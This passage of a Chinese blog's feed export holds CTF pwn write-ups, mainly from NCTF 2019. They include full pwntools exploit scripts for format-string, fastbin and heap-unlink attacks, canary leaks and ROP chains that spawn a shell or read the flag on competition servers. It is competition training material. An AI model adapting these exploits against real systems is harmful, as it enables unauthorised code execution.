class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn1")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line"> global lib</span><br><span class="line"> global sh</span><br><span class="line"> if(debug == 1):</span><br><span class="line">  sh = process("./pwn1")</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> else:</span><br><span class="line">  sh = remote(ip,port)</span><br><span class="line">  lib = ELF("libc-2.23.so")</span><br><span class="line"> pop_rdi_ret = elf.search(asm("pop rdi\nret")).next()</span><br><span class="line"> pop_rsi_r15_ret = elf.search(asm("pop rsi\npop r15\nret")).next()</span><br><span class="line"> def add(idx,size,content):</span><br><span class="line">  sh.sendlineafter(":","1")</span><br><span class="line">  sh.sendlineafter(":",str(idx))</span><br><span class="line">  sh.sendlineafter(":",str(size))</span><br><span class="line">  sh.sendlineafter(":",content)</span><br><span class="line"> def edit(idx,content):</span><br><span class="line">  sh.sendlineafter(":","4")</span><br><span class="line">  sh.sendlineafter(":",str(idx))</span><br><span class="line">  sh.sendlineafter(":",content)</span><br><span class="line"> def free(idx):</span><br><span class="line">  sh.sendlineafter(":","2")</span><br><span class="line">  sh.sendlineafter(":",str(idx))</span><br><span class="line"> chunk_list = 0x202060</span><br><span class="line"> payload = '%14$pAA%2$pB'</span><br><span class="line"> sh.sendlineafter(":",payload)</span><br><span class="line"> sh.recvuntil("Hello, ")</span><br><span class="line"> pie = int(sh.recvuntil("AA",True),16) - (0x55d7eaef1200 - 0x55d7eaef0000)</span><br><span class="line"> libc = int(sh.recvuntil("B",True),16) - lib.symbols['__malloc_initialize_hook'] + 0x30</span><br><span class="line"> __free_hook = libc + lib.symbols['__free_hook']</span><br><span class="line"> system = libc + lib.symbols['system']</span><br><span class="line"> add(0,0x88,'\x11' * 0x87)</span><br><span class="line"> add(1,0xF8,'\x12' * 0xF7)</span><br><span class="line"> add(2,0x18,'\x13' * 0x17)</span><br><span class="line"> free(0)</span><br><span class="line"> payload = p64(0) + p64(0x81) + p64(pie + chunk_list - 0x18) + p64(pie + chunk_list - 0x10)</span><br><span class="line"> payload = payload.ljust(0x80,'\x00')</span><br><span class="line"> payload += p64(0x80)</span><br><span class="line"> add(0,0x88,payload)</span><br><span class="line"> free(1)</span><br><span class="line"> payload = p64(0) * 3 + p64(__free_hook - 8) + p64(0x100)</span><br><span class="line"> payload += p64(__free_hook - 8) + p64(0x100)</span><br><span class="line"> edit(0,payload)</span><br><span class="line"> edit(0,'/bin/sh\x00' + p64(system))</span><br><span class="line"> free(0)</span><br><span class="line"> sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line"> pwn("47.108.135.45",20023,0)</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-scanf相关的漏洞详解</title>
      <link href="/2019/11/24/CTF-scanf%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/11/24/CTF-scanf%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="7b039562e6a233eb10441415de2fd9174b76f750523d37d23a93d81b854ca8d9">6f7372beb137aac8bdd9c404b5747d473174a4f3439a1d8317f3b86da64da9ec45f6e1cbe863ceeff58dbc6fbbd0f8a5f6556a6d057d82a40d95af035317746d6d09ddc419c9a77b354f43f070c061cc3388959ec63cd5ed919a562f4e14add87217e64305375b4a8c52d4eef8c08ef5241fe98315159c8f8e7c1f9d823df2b27a715cb95ec1e0398147011e515e5410fd27c5045e9c676658f732adabbb226e1f02e400f5a2ebbea329845cd6f169fff652324dcf80913dad0aad36011e06715975ff384ff4c56be165242bfc8c2789d94cbb0ad31423938caf831cae7e8ecefee404514a51788eaae98a5dfda72fe48d1d613d7524cc46957f0b9a0d3add4d26002d361bb3d30f3fc6af7751fff467e05109fbc4f1bb2a6a98e2b0a97855a2c7471bf3c022054cedcf5e4e749f5bd2c01be4874fb04494c0c2017229a1e1f7433c6f44a9c6ae068c67f9b6b9fd6bd6e9bd97e00d167cbf89e00dcb670ffc4022352608064ecc09ea60cddcbd939d4f67667d94cb5af797270956af84a85bd562ed9802f08dedf5418f462dcdfbf966df8b6ef479c487963409582c71fd076cfaccc7997cb8d7d9089b4903e76934a0cf7bcd5caea71bf16663a082b80493848c57c4a757bf110b672003d9f976210f669a72270feddf6f8b3cd99e521823c67214edea4ac03bec8f19ee51b592eced78aae75bba7e0c74626c1f7d2912021658239ce59a73a9a76ff5bf0b6185dfde3c1320d98fb6f5f0d05d8d303f205c05ab5bf918a6ecc2f07a6fba6cc559bf688f828b3794ec782ca207cfa8205d2ae249755882a59ebc1b9316373d3627f4ad5967f210e1bbd1c5bf0eaf331278e06fcd6b45843cacc0444a19a63cc532fdf006a77a3ca42e893e6ec0eea6850f06f5ab7bfcbd9cfef20ee82c6898e2213f9178cfdcb475c439fb7dcbde6ce86655fab4a6c5c5ac150982efb2c2fd5143adaa8d67529368bb8f779f2a0f1d1064c6aa895ea49765d618b802fd30b69a745fab8cfd198b5eba57c4a491b5c53940eea66198f62c2fa9989c30855b2f0cddbf049ec7c7ded43e12220fdf72c8887f41fb8e8624cc2398903561fcc5767345e185a2fc0ed308044facdfffdce57e85d87c1d2e994b80b93cbfc0f56826abca163d5db2fb7a309a15012080be61954eb614a7b83d6fd34299ad565e0890f2b98fbd4241f35d43ae12153c69e66a28b4ec3196af95064bf5b75e92bccf5e5a3ee09c0eaadcf71349cb12283fd13416f241880f10bc37a1578875e17b29fe234aef0c0d0feb91e40b0df01b5d6113f10e1182a4e08056100a7a71230e1d44fc6d9d1317d40f1d51870e7e071cc228b9103c4de8a1562d340efbf593cfddef03154f03309189b71d86c81a7c5b280e74ccd32fc2eecbcaf2035069107070149fbfcf5bc91d2c3a190ef92678882652da699b8f6211a446ce5315c113bddc2c49c8773fdd007c80de9a36c2530044dd5a87036aad716ff35fd5076e90ccc1a2f1e97af90aa6f4090d9f1eb08446d5c3b9dfe5792b1a658c1b82e182861dc7ddb26d946f9af767483b6bbff962d11662b8910e0341bb3164c7d5ef3e5685a556546fe28c3b55f5eaf90a6499e7dd06bdb81e5c4ad84aef8034d2c67e1de2423a6085d7ddcf5edf8f8640bf035e42fbb3b430306443bc49ac05730d5d77c17f0c3cd21553448c89d4f9886009f7d57a7da281bdea79f275413181eb7d3f66a792be7a053d3d56e69f065f308c92290ef9e0a7953590d2465a7546ec28531635ed6c54d3201a2ec653aed52bbe6f3af5a66275a6e26bc8618d9b8f162b102aab1435207a290585ff1050dde57b3cf5b29f3a38793d9037c88dadbce60df6e9445000c9a922580cf88dad7182e66243691f138819a79c3d84b733098dc507aa3a925b09da14be8cca000cd548334b85681e5de11ea94c0335c733fbd7baf908aa0e03967834d50fff231de6f4462e8a6421ec0cc105f8912adf0e84b24975da939977aff2440b007f5b6c3eced98652728541dfca9d01770978be2b81f5121b84c51de7ed69e83a13e5d7fc983ef38ef5eaa8ed5e1f0d5dcad48532489a70b1bcf0df3be0a49fb435c8b2bc5132aa9f1053eff68109b7497b099a5b315f6bf845208919d49048bfa0bc296cf63810277ed294be16060ccc316a44722e23331aa91ee7bbd5b6b4d8464f271a9f3686f1314b791360697a39cf188588fbeaae8c8498f9681a56c2d805b99abb1a50e0bda40c6bb27a36b56a887b79c16c4e6129a42f73e7b818cf2bef9c88571800b80ca28d6619e484fb611313ecb4780d9d618ca19a13d891a428c5c46f3c981ba42e794f5e2f0c11a4dcc29179eb5a44e4f5edab05d90b450db392a8b91540144198cb7e08b4bd58324e750d20b2fb7aaa9ce65a594c6441d5db8af8d623f452d9efb92ecfe5a9d1df0bbc4caff98c046dd09c31c79b5c443426dbea14b86969f016e6503ba40d8011f6478d344c268dd6b2e4eca9538bd9cc9b0d40b6e0b043cfadbfb8a99b7451ed3218d1b64ce7db8bbe00e0e393b3725e75f1bf73ab175580f81f16d78d0e1494c04f65f7dded2eb52f89c124f422948cda24274aa639304af1a2f7a79a5bf36130652be4b813220d07752cc5fd550dc953e2b30d24609d0963c325317d2bdd0a226bd27497182601fa200c3ccd6ce0cd2f4cc438c5e8966ad2f6f6cea74035ddd16b32284df813f0b9f86480e14161a4249d48913a29bb8cf75dc0f55938fcc5b7ff04161867d8a7634460684383858d9afc3775d6dd6301de923495d968793170b1867984a2d5d886743947499e34a2f1dc76887f28906f74db80447d7b74144387d4be7c618c8d67e0c830a5eca85a082a22daf52d3b48b2a7e75bdb502d5463e25701db111b9974a8292dec1791764af871a5bd92445ab53519a5383b1fd968dd9367c1f41be6fe83523e0885509f717d706f7f05c2558d08448a5da8bc018b1fa0b74461295d1a4e37180eba36ce71e1b43e5a99c8aa291ea04f7d43f1432656cb0a7c89708a81160f26c01469cdabf31ad5fea56c1a5e7ebdb48372943c1ae3028de01e8b111b69005dcf7f9eccd5f892742cd8e72db492b57c891838e74604c6d46689c1802989948e3644dc4edc14c22dc11254556c7084d095c8e01835a0987f065b83717077efc0d4c30f7ccf421a5f333a7e287de5e1d76271559796134c9f31cda08b3d9298a4695f94e87aa727731c4bb2d2e8dcb17fcc8b8fa8bdfe14b337ba5c5aff072038cd6cb1c883ce9203d474de29ed2eaad8c0bb642f7d189d7d2b7f55f13bb7b16477e9261384871919ae6bc12cd4c31a6dec006d13a028b7b033e77cbf933bd25208114a7565dc8d7931f044233c0eb461b7dc60ee3d097b9f9d6a823f74a2452f6f749b4f8ed83ed4e9e2adf1b2e799247d601b62bf9265cbe26ce1a3b3c1bfe60da62642f2df3ff89db7a8f9a620f49fdba68dcd374abd20e6f2c1a09aaa6809d6dac82e4feb162f61ae4eb907b978b21fd5e06b457f700c3f5fcb0876b46ffa84c9b5bec8a308cc8899dfff3798a48c353eaf213e2d2855d7f977b28798658889fe7e6371a96bc3d5b0e371c302a9db5927bb67689062a4bf4f32ae90a98389342bbd015276eecd459bc94f354e0f08cd02c57f43bc818b99fd3b766e61ca209a5bf8fee547e15a4ca82187db8b4cc567770812717016362f4c4a2e88125c764af274a75a5c03300439ea40ec0428ab0f29ce2da5eec7904cb0b93a62caf06b6d90faaf20e83bc800863f8600f0c6ba82e08301eff33f55858c8fb64a8f3d7794edbd869bc88f1a7ac3e73313291e61bd190dcb4777361e095691cbe84a11f979b9fd00977613974db346fb44a4f28d387df42602b009b994365a0b3a4916a1592adf6b19e30edd23599e0fe30c7c419f290e01b3347987869caa257c1346238a03689d49416f438d946cf536144afa992aa3af3fda96209778c61f0fad17bc691be4c9f4c4d69c2d85eded0f59ac6fe38c4724430686cd8e65345e3d635ffa07335e825620adb92377524569a157cb222c51da3f27c0b1ffe5bdb401a1208b98418a2c7b88b8160baa6d328ebbfab5513db0a3a6a28457100b1bc7389a4c64fec4a95d02c5c7bb706f9caa923fe3b1d58ba40a5588796db4c366d7c6acc99378c9c3dd976140f844c7463abe03be0e452b7bc50ef1e90120d76e2798a7c9cbe1ac8332fe83aa544c56f9db68b1661e8bec5b29b1ede2dc19e614ff75f69380f8d3b3c8fde8ebe84ae7a8ea69bcfd8c1e6bd4ef3c30d768f2b4acdd42e26ab5c386472fae63d1036b1a587db5ecccc7482f272ec9a74bbcf081f32c9b541bdd8e2408c12f5832190ec590de46b468af3c44077d8b2724ebc4ca641d9d9d23aba683a3960e5b83b3c9781628acdd83921c4a9e2a470d4e279628f3c99e32f35a95a88219d4ea98e29363b311f0642445783ad538ec527c8eb767a7be8cf9062e854a16f4ee6861ca22e79d13a945b61c80a35c1535c570980b835130666034ba1dd8f2c0e7d45b029834dd4d8c02ed36684e39c3e5bae7abe98e7a5cda6f03e789872c5f4b50ec611c4a94be91ee9d3473acb3337bc826d3ac5438bc3507a1cda4b75e8dcc902ddf286292efaf632f5baba93c4308d3c76d497687033b34bc20c54f2842b84397e3cbc5320908e096fa8756c46774f78144b3fe6464f54d340aac77d5f96824fae002d233f9c09d5fab893e4ad76911c7eac0691b7b54adde2bb1110c0b496bb806f5b35d3a628f3d6a576ff92cc052c39ae0a52d10d50fd1be20a14048e58c3d54439fbe83ed84aa2cc49afc4868522da98f60d8c15e7e9db3db8983d151d7d0425c24f2d5ee23befe21701e4f905810d19a5539454650dc8a99178b7bdd081d6758ec81fab81e80d5e22fc48e435fdc09ae53f220991eeff683c23f7fc068a657cd3f5872b3f9d321808fd335866dc1010d06687604f421bd6f09a1b89337da086805f7f50bee144308545fe67e41b7394ea4f8ad393f1f7584c0be05d938a4e2b00b905f9468bdd3f8bc9bc93481466de33b3080952b87d9da13259fad125f5ef50503580ce634d89c42342e63b4d1f467677679b9caf70074b89f833e86bc79a65fade6116f3688cc60dce78b251313fe887c8692ce767768acab23147cde2c3ae83b4670dfc6786759b169bf7b2b74a34fb52a6d95a3e747138d269d202159e313ecea2c5cba0b17b4ed862818d31f03bb29f6aece0145522535ff100173c490bf27eb11bb0b67a2989ce05baf1180e6ada5f89310b526ab918f35cf5674d7115f71268021055e1cc81c69e6e2fa539ff1fa7d986ba63e8fa8fe</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-NCTF-19年11月</title>
      <link href="/2019/11/24/CTF-NCTF-19%E5%B9%B411%E6%9C%88/"/>
      <url>/2019/11/24/CTF-NCTF-19%E5%B9%B411%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="CTF-2019NCTF-南邮CTF"><a href="#CTF-2019NCTF-南邮CTF" class="headerlink" title="CTF-2019NCTF-南邮CTF"></a>CTF-2019NCTF-南邮CTF</h1><h3 id="前言：帮朋友的战队打了一下比赛，ak了pwn，原本觉得新生赛应该学不到什么东西，只能提高自己的熟练度，发现有一题学到了一个新的东西，发现了自己的盲点，感谢出题人。"><a href="#前言：帮朋友的战队打了一下比赛，ak了pwn，原本觉得新生赛应该学不到什么东西，只能提高自己的熟练度，发现有一题学到了一个新的东西，发现了自己的盲点，感谢出题人。" class="headerlink" title="前言：帮朋友的战队打了一下比赛，ak了pwn，原本觉得新生赛应该学不到什么东西，只能提高自己的熟练度，发现有一题学到了一个新的东西，发现了自己的盲点，感谢出题人。"></a>前言：帮朋友的战队打了一下比赛，ak了pwn，原本觉得新生赛应该学不到什么东西，只能提高自己的熟练度，发现有一题学到了一个新的东西，发现了自己的盲点，感谢出题人。</h3><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h2 id="0x01-pwn-me-100-year-II"><a href="#0x01-pwn-me-100-year-II" class="headerlink" title="0x01 pwn me 100 year!(II)"></a>0x01 pwn me 100 year!(II)</h2><hr><h3 id="第一个read可以输入-p导致pie泄露，然后确定key的位置，然后printf的格式化字符串漏洞改一下值就好了"><a href="#第一个read可以输入-p导致pie泄露，然后确定key的位置，然后printf的格式化字符串漏洞改一下值就好了" class="headerlink" title="第一个read可以输入%p导致pie泄露，然后确定key的位置，然后printf的格式化字符串漏洞改一下值就好了"></a>第一个read可以输入%p导致pie泄露，然后确定key的位置，然后printf的格式化字符串漏洞改一下值就好了</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn_me_2")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line"> global lib</span><br><span class="line"> global sh</span><br><span class="line"> if(debug == 1):</span><br><span class="line">  sh = process("./pwn_me_2")</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> else:</span><br><span class="line">  sh = remote(ip,port)</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> sh.sendlineafter(':',"a" * 0x10 + "%p\x00")</span><br><span class="line"> sh.recvuntil("preparing......\n")</span><br><span class="line"> pie = int(sh.recvuntil("pwn me 100",True),16) - 0x563519b85080 + 0x563519983000</span><br><span class="line"> key = pie + 0x2020E0</span><br><span class="line"> payload = "%" + str(0x6666) + "d%10$hn%11$hn"</span><br><span class="line"> payload = payload.ljust(0x30 - 0x10,'\x00')</span><br><span class="line"> payload += p64(key) + p64(key+2)</span><br><span class="line"> sh.sendlineafter("?",payload)</span><br><span class="line"> sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line"> pwn("139.129.76.65",50005,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x02-pwn-me-100-year-III"><a href="#0x02-pwn-me-100-year-III" class="headerlink" title="0x02 pwn me 100 year!(III)"></a>0x02 pwn me 100 year!(III)</h2><hr><h3 id="先利用malloc和free在read之后的末尾字节未置零从而实现heap-leak，edit功能存在0x10字节的溢出，利用fastbin-attack即可修改heap头的堆块，触发backdoor"><a href="#先利用malloc和free在read之后的末尾字节未置零从而实现heap-leak，edit功能存在0x10字节的溢出，利用fastbin-attack即可修改heap头的堆块，触发backdoor" class="headerlink" title="先利用malloc和free在read之后的末尾字节未置零从而实现heap leak，edit功能存在0x10字节的溢出，利用fastbin attack即可修改heap头的堆块，触发backdoor"></a>先利用malloc和free在read之后的末尾字节未置零从而实现heap leak，edit功能存在0x10字节的溢出，利用fastbin attack即可修改heap头的堆块，触发backdoor</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn_me_3")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line"> global lib</span><br><span class="line"> global sh</span><br><span class="line"> if(debug == 1):</span><br><span class="line">  sh = process("./pwn_me_3")</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> else:</span><br><span class="line">  sh = remote(ip,port)</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> def add(size,content):</span><br><span class="line">  sh.sendlineafter("exit","1")</span><br><span class="line">  sh.sendlineafter(":",str(size))</span><br><span class="line">  sh.sendafter(":",content)</span><br><span class="line"> def edit(idx,content):</span><br><span class="line">  sh.sendlineafter("exit","4")</span><br><span class="line">  sh.sendlineafter(":",str(idx))</span><br><span class="line">  sh.sendafter(":",content)</span><br><span class="line"> def free(idx):</span><br><span class="line">  sh.sendlineafter("exit","2")</span><br><span class="line">  sh.sendlineafter(":",str(idx))</span><br><span class="line"> def show(idx):</span><br><span class="line">  sh.sendlineafter("exit","3")</span><br><span class="line">  sh.sendlineafter("idx",str(idx))</span><br><span class="line"> add(0x18,'a' * 0x18)</span><br><span class="line"> add(0x18,'b' * 0x18)</span><br><span class="line"> free(0)</span><br><span class="line"> free(1)</span><br><span class="line"> add(8,'\n')</span><br><span class="line"> add(0,'')</span><br><span class="line"> show(0)</span><br><span class="line"> sh.recvuntil("\n")</span><br><span class="line"> heap_base = u64(sh.recvuntil("\n1,a",True)[-4:].ljust(8,'\x00')) - 0xa</span><br><span class="line"> log.success("heap_base: " + hex(heap_base))</span><br><span class="line"> add(0x18,'c' * 0x18)</span><br><span class="line"> free(2)</span><br><span class="line"> edit(1,'a' * 0x10 + p64(0x20) + p64(0x41))</span><br><span class="line"> free(0)</span><br><span class="line"> add(0x38,'a' * 0x18 + p64(0x21) + p64(heap_base))</span><br><span class="line"> add(0x18,p32(0xdeadbeef))</span><br><span class="line"> add(0x18,p32(0x66666666))</span><br><span class="line"> sh.sendline("5")</span><br><span class="line"> sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line"> pwn("139.129.76.65",50006,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x03-warmup"><a href="#0x03-warmup" class="headerlink" title="0x03 warmup"></a>0x03 warmup</h2><hr><h3 id="导入ida看到开了沙盒，考虑使用orw，然后程序有read、printf、read，可以实现canary-leak，然后第二个read存在严重的栈溢出，然后puts一下got数据实现libc-leak，再回到main进行二次劫持，接着调用mprotect函数来设置bss段的数据可读可写可执行，然后再bss段上放好orwshellcode然后跳过去执行就可以拿到flag了，介于之前的题目中出现过cat-flag的字符串，所以猜测flag和elf在同一个目录下，所以直接open-“flag”-即可"><a href="#导入ida看到开了沙盒，考虑使用orw，然后程序有read、printf、read，可以实现canary-leak，然后第二个read存在严重的栈溢出，然后puts一下got数据实现libc-leak，再回到main进行二次劫持，接着调用mprotect函数来设置bss段的数据可读可写可执行，然后再bss段上放好orwshellcode然后跳过去执行就可以拿到flag了，介于之前的题目中出现过cat-flag的字符串，所以猜测flag和elf在同一个目录下，所以直接open-“flag”-即可" class="headerlink" title="导入ida看到开了沙盒，考虑使用orw，然后程序有read、printf、read，可以实现canary leak，然后第二个read存在严重的栈溢出，然后puts一下got数据实现libc leak，再回到main进行二次劫持，接着调用mprotect函数来设置bss段的数据可读可写可执行，然后再bss段上放好orwshellcode然后跳过去执行就可以拿到flag了，介于之前的题目中出现过cat flag的字符串，所以猜测flag和elf在同一个目录下，所以直接open(“flag”)即可"></a>导入ida看到开了沙盒，考虑使用orw，然后程序有read、printf、read，可以实现canary leak，然后第二个read存在严重的栈溢出，然后puts一下got数据实现libc leak，再回到main进行二次劫持，接着调用mprotect函数来设置bss段的数据可读可写可执行，然后再bss段上放好orwshellcode然后跳过去执行就可以拿到flag了，介于之前的题目中出现过cat flag的字符串，所以猜测flag和elf在同一个目录下，所以直接open(“flag”)即可</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("warm_up")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line"> global lib</span><br><span class="line"> global sh</span><br><span class="line"> if(debug == 1):</span><br><span class="line">  sh = process("./warm_up")</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> else:</span><br><span class="line">  sh = remote(ip,port)</span><br><span class="line">  lib = ELF("libc-2.23.so")</span><br><span class="line"> pop_rdi_ret = elf.search(asm("pop rdi\nret")).next()</span><br><span class="line"> pop_rsi_r15_ret = elf.search(asm("pop rsi\npop r15\nret")).next()</span><br><span class="line"> sh.sendafter('!!!','a' * 0x19)</span><br><span class="line"> sh.recvuntil('a' * 0x18)</span><br><span class="line"> canary = u64(sh.recv(8)) - 0x61</span><br><span class="line"> payload = 'a' * 0x18 + p64(canary) + 'a' * 8</span><br><span class="line"> payload += p64(pop_rdi_ret)</span><br><span class="line"> payload += p64(elf.got['__libc_start_main'])</span><br><span class="line"> payload += 